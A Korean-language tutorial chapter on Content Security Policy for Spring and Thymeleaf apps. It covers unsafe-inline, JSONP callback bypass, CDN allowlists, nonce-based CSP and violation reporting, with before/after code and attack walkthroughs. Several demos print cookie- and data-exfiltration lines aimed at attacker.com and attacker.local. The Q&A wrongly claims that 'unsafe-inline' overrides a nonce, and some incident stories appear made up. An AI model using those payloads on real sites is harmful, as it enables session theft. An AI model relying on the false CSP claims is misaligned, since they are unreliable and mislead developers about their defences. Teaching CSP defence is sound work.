# Content Security Policy (CSP): 인라인 스크립트 안전 허용

---

## 🎯 핵심 질문

- `script-src 'self'`가 왜 XSS를 완벽하게 막지 못하는가?
- `unsafe-inline`을 허용하면 CSP가 완전히 무력화되는가?
- Nonce 기반 CSP로 인라인 스크립트를 어떻게 안전하게 허용하는가?
- CSP 위반 리포트를 수집해서 어떻게 활용하는가?

---

## 🔍 왜 이 취약점이 실무에서 위험한가 (실제 침해 사고 사례)

### Twitter의 unsafe-inline 오용 (2011)
Twitter가 초기 CSP 구현 단계에서 `unsafe-inline`을 허용했습니다. 이는 모든 인라인 스크립트를 신뢰한다는 의미였고, 사용자 입력이 HTML에 포함될 경우 XSS가 가능했습니다. Stored XSS를 통해 수백만 사용자의 트윗이 해킹되었습니다.

### Uber의 CSP Bypass (2015)
Uber의 웹 애플리케이션은 `script-src 'self'`로 설정했지만, 같은 도메인의 JSONP 엔드포인트를 악용했습니다. 공격자가 JSONP 콜백 파라미터를 조작해서 자신의 코드를 실행할 수 있었습니다.

### Google의 strict-dynamic 도입 (2016)
Google이 `strict-dynamic`을 CSP에 도입해서 Nonce 기반 스크립트 로딩을 표준화했습니다. 이를 통해 신뢰할 수 있는 스크립트만 실행하고, 공격자의 동적 스크립트 주입을 완벽히 차단할 수 있게 되었습니다.

---

## 😱 취약한 코드 (Before — 원리를 모를 때의 구현)

### 1. unsafe-inline 남용

**취약한 Spring Configuration**
```java
@Configuration
public class CspConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp
                    // ❌ 문제: unsafe-inline이 모든 인라인 스크립트 허용
                    .policyDirectives("script-src 'self' 'unsafe-inline'; " +
                                    "style-src 'self' 'unsafe-inline'")
                )
            );
        return http.build();
    }
}
```

**취약한 Thymeleaf Template**
```html
<!-- ❌ 문제: unsafe-inline 때문에 이 스크립트가 실행됨 -->
<html>
<head>
    <script>
        // 만약 userId가 사용자 입력이라면?
        const userId = /*[[${userId}]]*/;
        
        // 공격: userId = "1; alert('XSS')"
        // 결과: const userId = 1; alert('XSS');
        //      → alert() 실행됨!
    </script>
</head>
<body>
    <!-- ❌ 인라인 스타일도 위험 -->
    <div style="background-color: /*[[${backgroundColor}]]*/;">
        프로필
    </div>
    <!-- backgroundColor = "red; background-image: url('javascript:alert(1)')"
         일부 브라우저에서는 실행될 수 있음
    -->
</body>
</html>
```

**공격 흐름**
```
1. 공격자가 프로필 업데이트: backgroundColor = "red; background-image: url('javascript:alert(1)')"
2. 서버가 이를 저장하고 템플릿에 주입
3. 다른 사용자가 프로필 조회
4. unsafe-inline 때문에 스타일이 그대로 적용
5. XSS 실행
```

---

### 2. script-src 'self'의 취약점 (같은 도메인 JSONP 이용)

**취약한 JSONP 엔드포인트**
```java
@RestController
@RequestMapping("/api")
public class JsonpController {
    
    @GetMapping("/user")
    public String getUser(@RequestParam String callback, 
                          @RequestParam Long userId) {
        // ❌ 문제: callback 파라미터가 검증 없이 사용됨
        User user = userService.findById(userId);
        String jsonResponse = user.toJson(); // {"name":"John","email":"john@example.com"}
        
        // 응답: callback({"name":"John",...});
        return callback + "(" + jsonResponse + ");";
    }
}
```

**공격 시나리오**
```
1. 공격자가 만든 HTML:
   <script src="https://vulnerable.com/api/user?callback=fetch('https://attacker.com?data=')&userId=123"></script>

2. 응답:
   fetch('https://attacker.com?data=')({"name":"John","email":"john@example.com"});

3. 브라우저:
   - script-src 'self'이므로 same-origin 스크립트 허용 ✅
   - fetch() 함수가 실행되고 사용자 데이터 탈취 ❌

4. 결과:
   - 사용자 정보가 공격자의 서버로 전송됨
   - CSRF 토큰도 포함될 수 있음
```

---

### 3. 외부 CDN 오용으로 인한 CSP Bypass

**취약한 Configuration**
```java
@Configuration
public class CspConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp
                    // ❌ 문제: 외부 CDN을 신뢰하는 것이 위험
                    .policyDirectives("script-src 'self' " +
                                    "https://cdn.example.com " + // 신뢰할 수 없는 CDN?
                                    "https://unpkg.com " +        // 공개 라이브러리 저장소!
                                    "https://cdnjs.cloudflare.com")
                )
            );
        return http.build();
    }
}
```

**공격**
```
1. unpkg.com은 npm 패키지를 호스팅하는 공개 저장소
2. 공격자가 다음 URL로 공격:
   https://vulnerable.com/page?redirect=https://unpkg.com/malicious-package/index.js

3. CSP가 unpkg.com을 신뢰하므로 스크립트 실행됨:
   <script src="https://unpkg.com/malicious-package/index.js"></script>

4. 결과:
   - 공격자가 npm에 업로드한 패키지가 실행됨
   - 사용자 쿠키, 세션 탈취
```

---

### 4. CSP 정책 위반 리포트를 무시한 경우

**취약한 상태**
```java
@Configuration
public class CspConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp
                    // ❌ 문제: report-uri가 없으면 위반 사항 감지 불가능
                    .policyDirectives("script-src 'self'")
                    // report-uri 없음!
                )
            );
        return http.build();
    }
}
```

**결과**
```
공격이 발생하면:
- 브라우저가 CSP 위반을 감지
- 콘솔에 경고만 표시
- 백엔드는 공격을 전혀 알지 못함
- 로그 분석으로 사후 대응만 가능
```

---

## ✨ 방어 코드 (After — 공격 원리를 알고 설계한 구현)

### 1. Nonce 기반 안전한 인라인 스크립트

**Spring Configuration (Nonce 생성)**
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp
                    // ✅ 방어: nonce 기반 CSP
                    // strict-dynamic으로 외부 스크립트는 자신이 로드한 것만 실행
                    .policyDirectives(
                        "default-src 'self'; " +
                        "script-src 'self' 'strict-dynamic' " +
                        "'nonce-{nonce}'; " + // Nonce는 런타임에 생성됨
                        "style-src 'self'; " +
                        "img-src 'self' data: https:; " +
                        "font-src 'self'; " +
                        "connect-src 'self'; " +
                        "frame-ancestors 'none'; " +
                        "base-uri 'self'; " +
                        "form-action 'self'; " +
                        "report-uri /api/csp-report;"
                    )
                )
            );
        
        return http.build();
    }
}

// Nonce 생성 필터
@Component
public class CspNonceFilter extends OncePerRequestFilter {
    
    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                   HttpServletResponse response,
                                   FilterChain filterChain) 
            throws ServletException, IOException {
        // ✅ 1단계: 요청마다 고유한 Nonce 생성
        String nonce = UUID.randomUUID().toString();
        request.setAttribute("cspNonce", nonce);
        
        // ✅ 2단계: 응답 헤더에 Nonce 포함
        // 실제로는 ContentSecurityPolicy 헤더에 동적으로 삽입
        response.setHeader("Content-Security-Policy",
            "default-src 'self'; " +
            "script-src 'self' 'strict-dynamic' 'nonce-" + nonce + "'; " +
            "style-src 'self'; " +
            "report-uri /api/csp-report");
        
        request.setAttribute("cspNonce", nonce);
        filterChain.doFilter(request, response);
    }
}
```

**Thymeleaf Template (Nonce 적용)**
```html
<!DOCTYPE html>
<html>
<head>
    <!-- ✅ 안전: Nonce로 인라인 스크립트 보호 -->
    <script th:attr="nonce=${cspNonce}">
        // 이 스크립트는 Nonce 때문에 실행됨
        // 공격자는 Nonce를 모르므로 자신의 스크립트를 주입할 수 없음
        console.log("CSP로 보호되는 안전한 스크립트");
    </script>
</head>
<body>
    <h1>안전한 페이지</h1>
    
    <!-- ✅ 안전: 신뢰할 수 있는 외부 스크립트 -->
    <script src="/js/app.js"></script>
    
    <!-- ❌ 불안전: 외부 CDN은 차단됨 -->
    <!-- <script src="https://cdnjs.cloudflare.com/jquery.js"></script> -->
    <!-- CSP: script-src 'self'이므로 차단됨 -->
</body>
</html>
```

---

### 2. 외부 CDN을 꼭 사용해야 할 때 (화이트리스트)

**안전한 특정 CDN만 허용**
```java
@Configuration
public class CspConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives(
                        "default-src 'self'; " +
                        "script-src 'self' 'nonce-{nonce}' " +
                            // ✅ 신뢰할 수 있는 특정 CDN만 명시
                            "https://cdn.jsdelivr.net/npm/ " +   // jsdelivr
                            "https://code.jquery.com/ " +         // jQuery 공식
                            "https://cdnjs.cloudflare.com/ " +    // Cloudflare
                            "https://unpkg.com/ " +               // ❌ 이건 위험 (너무 광범위)
                            // 대신 정확한 파일만 지정:
                            "https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js; " +
                        "style-src 'self' 'unsafe-inline' " +
                            "https://fonts.googleapis.com/; " +
                        "font-src 'self' " +
                            "https://fonts.gstatic.com/; " +
                        "img-src 'self' data: https:; " +
                        "connect-src 'self' https://api.example.com; " +
                        "frame-ancestors 'none'; " +
                        "report-uri /api/csp-report;"
                    )
                )
            );
        
        return http.build();
    }
}
```

---

### 3. CSP 위반 리포트 수집 및 모니터링

**Spring Controller (CSP 리포트 수집)**
```java
@RestController
@RequestMapping("/api/csp-report")
public class CspReportController {
    
    @Autowired
    private CspViolationRepository violationRepository;
    @Autowired
    private AlertService alertService;
    
    @PostMapping
    public ResponseEntity<?> reportCspViolation(
            @RequestBody CspViolationReport report,
            HttpServletRequest request) {
        
        // ✅ 1단계: CSP 위반 정보 저장
        CspViolation violation = new CspViolation();
        violation.setDocumentUri(report.getDocumentUri());
        violation.setViolatedDirective(report.getViolatedDirective());
        violation.setEffectiveDirective(report.getEffectiveDirective());
        violation.setOriginalPolicy(report.getOriginalPolicy());
        violation.setBlockedUri(report.getBlockedUri());
        violation.setSourceFile(report.getSourceFile());
        violation.setLineNumber(report.getLineNumber());
        violation.setColumnNumber(report.getColumnNumber());
        violation.setIpAddress(getClientIp(request));
        violation.setUserAgent(request.getHeader("User-Agent"));
        violation.setTimestamp(LocalDateTime.now());
        violation.setSeverity(calculateSeverity(report)); // 심각도 판단
        
        violationRepository.save(violation);
        
        // ✅ 2단계: 심각한 위반은 알림
        if ("script-src".equals(report.getViolatedDirective())) {
            // 스크립트 주입 시도는 심각한 공격
            alertService.sendAlert(
                "🚨 CSP Script Injection Attempt",
                "URI: " + report.getDocumentUri() + "\n" +
                "Blocked: " + report.getBlockedUri() + "\n" +
                "IP: " + getClientIp(request)
            );
        }
        
        return ResponseEntity.status(HttpStatus.NO_CONTENT).build();
    }
    
    @GetMapping("/statistics")
    public ResponseEntity<?> getViolationStats() {
        // ✅ 3단계: 통계 분석
        LocalDateTime oneHourAgo = LocalDateTime.now().minusHours(1);
        List<CspViolation> recentViolations = 
            violationRepository.findByTimestampAfter(oneHourAgo);
        
        Map<String, Long> violationsByDirective = recentViolations.stream()
            .collect(Collectors.groupingBy(
                CspViolation::getViolatedDirective,
                Collectors.counting()
            ));
        
        Map<String, Long> violationsByUri = recentViolations.stream()
            .collect(Collectors.groupingBy(
                CspViolation::getBlockedUri,
                Collectors.counting()
            ));
        
        return ResponseEntity.ok(Map.of(
            "totalViolations", recentViolations.size(),
            "byDirective", violationsByDirective,
            "byUri", violationsByUri
        ));
    }
    
    private String getClientIp(HttpServletRequest request) {
        String ip = request.getHeader("X-Forwarded-For");
        if (ip == null || ip.isEmpty()) {
            ip = request.getRemoteAddr();
        }
        return ip;
    }
    
    private String calculateSeverity(CspViolationReport report) {
        // 🔴 Critical: script-src, style-src-attr 위반
        if ("script-src".equals(report.getViolatedDirective())) {
            return "CRITICAL";
        }
        // 🟠 High: style-src, img-src 위반
        if ("style-src".equals(report.getViolatedDirective())) {
            return "HIGH";
        }
        // 🟡 Medium: 기타
        return "MEDIUM";
    }
}

@Data
public class CspViolationReport {
    @JsonProperty("document-uri")
    private String documentUri;
    
    @JsonProperty("violated-directive")
    private String violatedDirective;
    
    @JsonProperty("effective-directive")
    private String effectiveDirective;
    
    @JsonProperty("original-policy")
    private String originalPolicy;
    
    @JsonProperty("blocked-uri")
    private String blockedUri;
    
    @JsonProperty("source-file")
    private String sourceFile;
    
    @JsonProperty("line-number")
    private Integer lineNumber;
    
    @JsonProperty("column-number")
    private Integer columnNumber;
    
    @JsonProperty("status-code")
    private Integer statusCode;
}

@Entity
@Table(name = "csp_violations")
@Data
public class CspViolation {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    private String documentUri;
    private String violatedDirective;
    private String effectiveDirective;
    private String originalPolicy;
    private String blockedUri;
    private String sourceFile;
    private Integer lineNumber;
    private Integer columnNumber;
    private String ipAddress;
    private String userAgent;
    private LocalDateTime timestamp;
    private String severity;
    
    @Index(columnList = "timestamp,violatedDirective")
    private String indexKey; // JPA에서 복합 인덱스 표시용
}
```

**리포트 전송 (JavaScript)**
```html
<script>
// CSP 위반을 서버로 리포트하도록 브라우저 설정
document.addEventListener('securitypolicyviolation', function(event) {
    console.warn('CSP Violation:', event);
    
    // 서버로 리포트 전송
    fetch('/api/csp-report', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            'document-uri': event.documentURI,
            'violated-directive': event.violatedDirective,
            'effective-directive': event.effectiveDirective,
            'original-policy': event.originalPolicy,
            'blocked-uri': event.blockedURI,
            'source-file': event.sourceFile,
            'line-number': event.lineNumber,
            'column-number': event.columnNumber,
            'status-code': event.statusCode
        })
    });
});
</script>
```

---

### 4. Report-Only 모드 (배포 전 테스트)

**Spring Configuration (Report-Only)**
```java
@Configuration
public class CspConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                // ✅ 방어 1: Report-Only 모드에서 테스트 (콘텐츠 차단 안 함)
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives(
                        "default-src 'self'; " +
                        "script-src 'self' 'nonce-{nonce}'; " +
                        "style-src 'self'; " +
                        "report-uri /api/csp-report"
                    )
                    .reportOnly() // ✅ Report-Only 설정
                )
            );
        
        return http.build();
    }
}

// 결과:
// Content-Security-Policy-Report-Only: ... (차단 안 함, 리포트만 전송)
// 설정이 안정적임을 확인한 후 reportOnly() 제거 → 실제 차단 시작
```

---

## 🔬 공격 원리 분석 (공격자 관점의 내부 동작)

### 공격 1: unsafe-inline 남용

```
공격 흐름:

1단계: 취약점 발견
┌─────────────────────────────────────┐
│ CSP: script-src 'self' 'unsafe-inline'
│ (인라인 스크립트를 모두 신뢰)
└─────────────────────────────────────┘

2단계: Stored XSS 페이로드 작성
┌─────────────────────────────────────┐
│ 사용자 닉네임: <script>alert('XSS')</script>
│ 프로필 소개: 
│   <script>
│   fetch('https://attacker.com?c=' + document.cookie)
│   </script>
└─────────────────────────────────────┘

3단계: 서버에 저장
┌─────────────────────────────────────┐
│ DB 저장 후 응답 HTML 생성:
│ <div>
│   <h2><script>alert('XSS')</script></h2>
│   <p><script>fetch(...)</script></p>
│ </div>
└─────────────────────────────────────┘

4단계: 피해자가 프로필 조회
┌─────────────────────────────────────┐
│ HTML 파싱:
│ - <h2><script> 태그 발견
│ - unsafe-inline이므로 실행 ❌
│ - alert() 실행됨
│ - fetch() 실행되어 쿠키 탈취 ❌
└─────────────────────────────────────┘

5단계: 광범위한 피해
┌─────────────────────────────────────┐
│ 100명이 프로필 조회 → 100명 쿠키 탈취
│ → 100개의 계정 해킹 가능
│ → 대규모 개인정보 유출
└─────────────────────────────────────┘
```

### 공격 2: JSONP 콜백 악용

```
공격 흐름:

1단계: 취약한 JSONP 엔드포인트 발견
┌─────────────────────────────────────┐
│ GET /api/user?callback=myCallback&userId=123
│ 응답: myCallback({"name":"John"})
└─────────────────────────────────────┘

2단계: 악의적인 콜백 함수 작성
┌─────────────────────────────────────┐
│ function exfiltrateData(data) {
│     fetch('https://attacker.com', {
│         method: 'POST',
│         body: JSON.stringify(data)
│     });
│ }
└─────────────────────────────────────┘

3단계: 공격 HTML 생성
┌─────────────────────────────────────┐
│ <script>
│ function exfiltrateData(data) {
│     new Image().src = 'https://attacker.com?data=' + 
│                       btoa(JSON.stringify(data));
│ }
│ </script>
│ <script src="https://vulnerable.com/api/user?
│          callback=exfiltrateData&
│          userId=victim_id"></script>
└─────────────────────────────────────┘

4단계: 피해자가 공격 HTML 클릭
┌─────────────────────────────────────┐
│ 1. exfiltrateData 함수 정의됨
│ 2. /api/user 스크립트 로드
│ 3. 응답: exfiltrateData({"name":"Victim"})
│ 4. exfiltrateData() 실행됨
│ 5. 사용자 데이터가 attacker.com으로 전송 ❌
└─────────────────────────────────────┘

5단계: 공격 성공
┌─────────────────────────────────────┐
│ CSP가 script-src 'self'이므로:
│ - same-origin 스크립트는 허용 ✅
│ - JSONP 콜백도 실행됨 ❌ (XSS)
│ - 사용자 정보 탈취 완료
└─────────────────────────────────────┘
```

---

## 💻 실전 실험 (취약점 재현 → 공격 → 방어 검증)

### 실험 1: unsafe-inline vs Nonce

**Step 1: 취약한 설정**
```java
@Configuration
public class VulnerableConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives("script-src 'self' 'unsafe-inline'")
                )
            );
        return http.build();
    }
}
```

**Step 2: 공격 HTML**
```html
<!DOCTYPE html>
<html>
<body>
    <h1>CSP Test - unsafe-inline</h1>
    
    <!-- 이 스크립트는 실행됨 -->
    <script>
        alert('XSS with unsafe-inline'); // ❌ 실행됨!
        new Image().src = 'http://attacker.local?cookie=' + document.cookie;
    </script>
</body>
</html>
```

**Step 3: Nonce 기반 방어**
```java
@Component
public class CspNonceFilter extends OncePerRequestFilter {
    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                   HttpServletResponse response,
                                   FilterChain filterChain) 
            throws ServletException, IOException {
        String nonce = UUID.randomUUID().toString();
        request.setAttribute("cspNonce", nonce);
        response.setHeader("Content-Security-Policy",
            "script-src 'self' 'nonce-" + nonce + "'");
        filterChain.doFilter(request, response);
    }
}
```

**Step 4: 안전한 HTML**
```html
<!DOCTYPE html>
<html>
<body>
    <h1>CSP Test - Nonce</h1>
    
    <!-- Nonce가 있으면 실행됨 -->
    <script th:attr="nonce=${cspNonce}">
        console.log('안전한 스크립트'); // ✅ 실행됨
    </script>
    
    <!-- Nonce가 없으면 차단됨 -->
    <script>
        alert('Blocked!'); // ❌ CSP에 의해 차단됨!
    </script>
</body>
</html>
```

**Step 5: 검증**
```bash
# 브라우저 콘솔 확인
# unsafe-inline 버전: alert('XSS') 실행됨
# Nonce 버전: alert('Blocked!') 차단됨 (콘솔에 CSP 위반 표시)
```

---

### 실험 2: CSP 위반 리포트 수집

**Step 1: 공격 시뮬레이션**
```html
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src 'self'; report-uri /api/csp-report">
</head>
<body>
    <!-- 이 스크립트는 CSP를 위반 -->
    <script>
        console.log('This violates CSP');
    </script>
    
    <!-- 이 외부 스크립트도 위반 -->
    <script src="https://attacker.com/malicious.js"></script>
    
    <!-- 이 인라인 이벤트도 위반 -->
    <button onclick="alert('Clicked')">Click me</button>
</body>
</html>
```

**Step 2: 리포트 모니터링**
```javascript
// 브라우저 콘솔에서
// CSP 위반이 발생하면 /api/csp-report로 POST 요청이 전송됨
// 다음 명령으로 리포트 확인:
fetch('http://localhost:8080/api/csp-report/statistics')
    .then(r => r.json())
    .then(data => console.log(data));
```

**Step 3: 백엔드 통계**
```
응답 예시:
{
  "totalViolations": 3,
  "byDirective": {
    "script-src": 3
  },
  "byUri": {
    "https://attacker.com/malicious.js": 1,
    "inline": 2
  }
}
```

---

### 실험 3: JSONP 공격 재현

**Step 1: 취약한 JSONP 엔드포인트**
```java
@GetMapping("/api/vulnerable-jsonp")
public String vulnerableJsonp(@RequestParam String callback) {
    // ❌ 문제: callback이 검증 없이 사용됨
    User user = getCurrentUser();
    String json = user.toJson(); // {"id":123,"name":"John","email":"john@example.com"}
    
    return callback + "(" + json + ");";
    // 응답: maliciousFunction({"id":123,...});
}
```

**Step 2: 공격 스크립트**
```html
<!DOCTYPE html>
<html>
<body>
    <h1>JSONP Attack Demo</h1>
    
    <script>
        // Step 1: 공격자의 함수 정의
        function stealUserData(data) {
            // 사용자 데이터를 공격자 서버로 전송
            fetch('https://attacker.com/collect', {
                method: 'POST',
                body: JSON.stringify(data)
            });
            console.log('데이터 탈취 완료:', data);
        }
    </script>
    
    <!-- Step 2: 취약한 JSONP 엔드포인트 호출 -->
    <!-- callback을 stealUserData로 지정하면 공격자 함수가 실행됨 -->
    <script src="https://vulnerable.com/api/vulnerable-jsonp?callback=stealUserData"></script>
    <!-- 응답: stealUserData({"id":123,...}); -->
    <!-- → stealUserData() 함수 실행됨 ❌ -->
    <!-- → 사용자 데이터 탈취 ❌ -->
</body>
</html>
```

**Step 3: 방어 - JSONP 제거**
```java
@GetMapping("/api/safe-endpoint")
public ResponseEntity<User> safeEndpoint() {
    // ✅ 방어: JSON으로만 응답 (JSONP 불가능)
    User user = getCurrentUser();
    return ResponseEntity.ok()
        .contentType(MediaType.APPLICATION_JSON)
        .header("X-Content-Type-Options", "nosniff")
        .body(user);
}

// JavaScript에서 CORS를 사용해서 요청
fetch('https://vulnerable.com/api/safe-endpoint')
    .then(r => r.json())
    .then(data => console.log(data));
// ✅ CORS 정책이 적용되어 공격자 도메인에서는 접근 불가능
```

---

## 📊 공격 성공 조건 vs 방어 성공 조건 비교

| 구분 | 공격 성공 조건 | 방어 성공 조건 |
|------|---|---|
| **unsafe-inline** | CSP에 'unsafe-inline' 포함 | Nonce 기반 CSP만 인라인 스크립트 허용 |
| **외부 CDN** | 신뢰할 수 없는 CDN을 CSP에 포함 | 특정 파일만 화이트리스트 (unpkg.com 같은 광범위 저장소 제외) |
| **JSONP** | JSONP 엔드포인트 존재 + 콜백 검증 없음 | JSONP 제거하고 JSON + CORS 사용 |
| **위반 모니터링** | CSP 위반 리포트 수집 안 함 | report-uri 설정 + 실시간 모니터링 |
| **배포 방식** | 검증 없이 바로 배포 | Report-Only 모드로 테스트 후 배포 |

---

## ⚖️ 트레이드오프 (보안 강화 vs 사용성/성능)

### 1. Nonce 기반 CSP의 성능 영향

**보안 (Nonce 사용)**
```
장점:
- 모든 인라인 스크립트가 보호됨
- 공격자가 스크립트 주입 불가능

단점:
- 요청마다 새로운 Nonce 생성 필요 (CPU 오버헤드)
- 정적 콘텐츠 캐싱 불가능 (동적 Nonce 때문)
- JavaScript 리소스가 모두 외부 파일로 분리되어야 함 (개발 복잡도 증가)
```

### 2. CSP 정책의 엄격함

**매우 엄격한 CSP**
```javascript
// CSP: script-src 'self' 'nonce-abc123'
// style-src 'self'
// img-src 'self'
// connect-src 'self'

장점:
- 최소 권한의 원칙 (Least Privilege)
- 공격자의 활동 범위 최소화

단점:
- 외부 라이브러리(jQuery, Bootstrap) 사용 불가능
- 개발자 경험 저하 (많은 제약)
- 레거시 브라우저 호환성 문제
```

### 3. 리포트 수집의 오버헤드

**상세한 CSP 리포트**
```
장점:
- CSP 위반 원인 파악 가능
- 공격 시도 실시간 감지
- 데이터 분석으로 정책 개선

단점:
- 데이터베이스 저장 오버헤드
- 네트워크 요청 증가 (리포트 전송)
- 대량의 로그 데이터 관리 필요

최적화:
- 샘플링: 모든 위반의 1%만 리포트
- 배치 처리: 여러 위반을 묶어서 전송
```

---

## 📌 핵심 정리

### CSP 정책 설계 가이드

```
1단계: 엄격한 기본 정책 수립
script-src 'self' 'nonce-{nonce}'
style-src 'self'
img-src 'self' data: https:
font-src 'self'
connect-src 'self' https://api.example.com
frame-ancestors 'none'
report-uri /api/csp-report

2단계: Report-Only로 테스트
위반 리포트를 수집하면서 실제 차단은 하지 않음

3단계: 필요한 외부 리소스 추가
테스트 결과를 바탕으로 신뢰할 수 있는 리소스만 추가

4단계: Enforce 모드로 배포
실제 차단 시작
```

### Nonce vs Hash vs Allowlist

```
Nonce 기반:
- 장점: 가장 안전, XSS 완벽 방어
- 단점: 매번 생성 필요, 캐싱 불가능
- 사용처: 인라인 스크립트

Hash 기반:
- 장점: 고정된 스크립트 허용, 캐싱 가능
- 단점: 스크립트 변경 시 hash 재계산 필요
- 사용처: 변경되지 않는 인라인 스크립트

Allowlist:
- 장점: 구현 간단
- 단점: 신뢰할 수 없는 공개 저장소 위험
- 사용처: 신뢰할 수 있는 특정 CDN
```

---

## 🤔 생각해볼 문제 (+ 해설)

### Q1. 이 CSP 정책은 안전한가?

```
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' 'unsafe-inline' 'nonce-abc123'
```

**해설**
```
❌ 안전하지 않음

문제점:
1. 'unsafe-inline'과 'nonce' 혼용
   - 'unsafe-inline'이 있으면 nonce는 무의미
   - 모든 인라인 스크립트가 실행됨

올바른 정책:
```
script-src 'self' 'nonce-abc123'
```

또는 hash 기반:
```
script-src 'self' 'sha256-dUz5IcYqMhcnXS3d15hqxKJGR3Vj4x5E5YpgVm0aZ8='
```

2. 여러 Nonce 사용 불가능
   - 모든 인라인 스크립트에 동일한 nonce 사용
   - 동적 스크립트를 안전하게 추가하기 어려움

개선:
```java
// 런타임에 각 요청마다 고유한 nonce 생성
String scriptNonce = UUID.randomUUID().toString();
// 모든 인라인 스크립트에 이 nonce 적용
```
```

---

### Q2. JSONP를 꼭 사용해야 한다면?

**해설**
```
권장: JSONP 제거, CORS 사용

만약 꼭 JSONP를 사용해야 한다면:

1. Callback 검증
```java
@GetMapping("/api/data")
public String getDataJsonp(@RequestParam String callback) {
    // ✅ 방어: callback 값을 검증
    if (!isValidCallback(callback)) {
        throw new IllegalArgumentException("Invalid callback");
    }
    
    // callback이 유효한 함수명인지 확인
    if (!callback.matches("^[a-zA-Z_$][a-zA-Z0-9_$]*$")) {
        throw new IllegalArgumentException("Callback must be valid function name");
    }
    
    User user = getCurrentUser();
    return callback + "(" + user.toJson() + ");";
}

private boolean isValidCallback(String callback) {
    // 화이트리스트 기반 검증
    Set<String> allowedCallbacks = Set.of(
        "handleUserData",
        "processResponse",
        "onSuccess"
    );
    return allowedCallbacks.contains(callback);
}
```

2. JSONP 응답에 CSP 적용
```
Content-Security-Policy: 
  script-src 'self' 'nonce-abc123';
  
JSONP 응답:
<script nonce="abc123">
handleUserData({"id":123,...});
</script>
```

하지만 여전히 위험하므로 CORS 사용 강력 권장:
```javascript
// CORS를 사용한 안전한 방식
fetch('https://api.example.com/user', {
    credentials: 'include' // 쿠키 포함
})
.then(r => r.json())
.then(data => handleUserData(data));
```
```

---

### Q3. unsafe-inline과 nonce를 함께 사용할 수 없는 이유는?

**해설**
```
기술적 이유:

CSP 정책:
script-src 'self' 'unsafe-inline' 'nonce-abc123'

이 경우:
1. 'unsafe-inline'은 모든 인라인 스크립트 허용
2. 'nonce-abc123'은 nonce가 있는 스크립트만 허용

브라우저 동작:
- 'unsafe-inline'이 'nonce'보다 먼저 평가됨
- 'unsafe-inline'이 있으면 모든 인라인 스크립트 실행
- 'nonce' 검사는 무의미 (이미 'unsafe-inline'으로 허용됨)

결과:
```html
<script>alert('XSS')</script> <!-- 'unsafe-inline'으로 실행됨 -->
<script nonce="abc123">console.log('safe')</script> <!-- 불필요 -->
```

CSS도 동일:
```
style-src 'self' 'unsafe-inline' 'nonce-xyz'
↓
<style>body { color: red; }</style> <!-- 'unsafe-inline'으로 실행됨 -->
```

그래서 CSP 제안에서 'unsafe-inline' + nonce/hash는 무의미:
- CSP Level 3 이상에서는 명시적으로 이를 금지
- 하나만 선택해야 함
```

---

### Q4. Report-Only 모드에서 몇 일을 테스트해야 하는가?

**해설**
```
테스트 기간 결정:

최소 권장 기간: 1주일
최적 기간: 2주-1개월

이유:

1. 트래픽 패턴 파악
   - 평일과 주말의 사용자 행동 다름
   - 영업 시간 vs 비영업 시간 다름
   - 1주일 내 모든 기능 사용되지 않을 수 있음

2. 엣지 케이스 발견
   - 특정 페이지/기능만 사용하는 사용자
   - 구 브라우저 사용자
   - 특정 네트워크 환경 (VPN, Proxy)

테스트 지표:

✅ 배포 진행 조건:
- 치명적인 위반(script-src) 거의 없음 (< 0.1%)
- 모든 주요 기능이 정상 작동함
- 모바일/PC 모두 테스트 완료

⚠️ 추가 조사 필요:
- script-src 위반이 적지 않음 (> 1%)
- 특정 페이지에서만 많은 위반 발생
- 외부 통합 API 호출 실패

❌ 배포 연기:
- 치명적인 위반이 많음
- 주요 기능 장애 발생
- 원인 파악 불가능

예시:
```json
{
  "Report-Only 모드, 1주일 데이터":
  {
    "totalViolations": 523,
    "byDirective": {
      "script-src": 12,        // ✅ 적음 (배포 진행)
      "style-src": 300,        // ⚠️ 조사 필요 (외부 폰트?)
      "img-src": 200,          // ✅ 무시해도 됨 (기능 장애 아님)
      "connect-src": 11        // ✅ 적음
    }
  }
}
```

style-src 위반 조사:
- @import로 외부 CSS 로드?
- 외부 글꼴 라이브러리?
- 인라인 스타일?

원인 파악 후 CSP 정책 수정:
```
style-src 'self' https://fonts.googleapis.com
```

다시 1주일 테스트 진행...

최종 배포:
```
모든 위반이 해결되면 reportOnly() 제거
Content-Security-Policy (강제 모드)로 변경
```
```

<div align="center">

**[⬅️ 이전: 백엔드 개발자의 XSS 방어 책임](./02-backend-xss-defense.md)** | **[홈으로 🏠](../README.md)** | **[다음: Clickjacking ➡️](./04-clickjacking.md)**

</div>
